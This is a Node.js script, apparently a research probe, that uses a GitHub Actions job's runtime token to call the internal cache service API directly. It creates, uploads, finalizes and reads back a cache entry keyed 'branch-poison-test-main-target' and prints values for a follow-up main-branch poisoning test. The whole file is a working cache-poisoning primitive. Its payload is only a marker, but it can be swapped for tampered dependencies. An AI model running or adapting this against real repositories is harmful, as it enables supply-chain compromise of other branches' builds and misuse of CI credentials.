const https = require('https');
const crypto = require('crypto');

const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';
const GITHUB_REF = process.env.GITHUB_REF || '';

const BRANCH_KEY = 'branch-poison-test-main-target';
const BRANCH_VERSION = crypto.createHash('sha256').update(BRANCH_KEY + '\nnode_modules').digest('hex');

function post(host, path, body) {
  return new Promise((resolve) => {
    const s = JSON.stringify(body);
    const r = https.request({
      hostname: host, path, method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(s) }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.write(s); r.end();
  });
}

async function main() {
  if (!RESULTS_URL || !RUNTIME_TOKEN) { console.log('Missing env'); return; }
  const host = new URL(RESULTS_URL).hostname;
  console.log('=== V13: Branch-scoped cache creation ===');
  console.log('GITHUB_REF:', GITHUB_REF);
  console.log('This run UUID:', ORCHESTRATION_ID.split('.')[0]);
  console.log('Creating cache on branch:', GITHUB_REF);

  const blobPut = (url, content) => new Promise((resolve) => {
    const u = new URL(url); const buf = Buffer.from(content, 'utf8');
    const r = https.request({ hostname: u.hostname, path: u.pathname + u.search, method: 'PUT',
      headers: { 'Content-Type': 'application/octet-stream', 'Content-Length': buf.length, 'x-ms-blob-type': 'BlockBlob' }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode })); });
    r.on('error', e => resolve({ status: 'ERR' })); r.write(buf); r.end();
  });

  const content = JSON.stringify({ created_on_branch: GITHUB_REF, key: BRANCH_KEY, run: ORCHESTRATION_ID.split('.')[0] });
  const size = Buffer.byteLength(content);

  const r1 = await post(host, '/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', {
    key: BRANCH_KEY, version: BRANCH_VERSION,
  });
  console.log('[1] CreateCacheEntry:', r1.status, '|', r1.body.substring(0, 200));

  if (r1.status === 200 && r1.body.includes('signed_upload_url')) {
    const entry = JSON.parse(r1.body);
    const r2 = await blobPut(entry.signed_upload_url, content);
    console.log('[2] Blob upload:', r2.status);

    const r3 = await post(host, '/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload', {
      key: BRANCH_KEY, version: BRANCH_VERSION, sizeBytes: size,
    });
    console.log('[3] Finalize:', r3.status, '|', r3.body);

    if (r3.status === 200) {
      // Read back in same branch run
      const r4 = await post(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
        key: BRANCH_KEY, version: BRANCH_VERSION,
      });
      const p4 = JSON.parse(r4.body || '{}');
      console.log('[4] Read on SAME BRANCH:', r4.status, p4.ok ? 'ok:true' : 'ok:false');
    }
  }

  console.log('\n=== FOR V14 MAIN-BRANCH TEST ===');
  console.log('BRANCH_KEY=' + BRANCH_KEY);
  console.log('BRANCH_VERSION=' + BRANCH_VERSION);
  console.log('CREATING_BRANCH=' + GITHUB_REF);
}
main().catch(e => console.log('Fatal:', e.message));
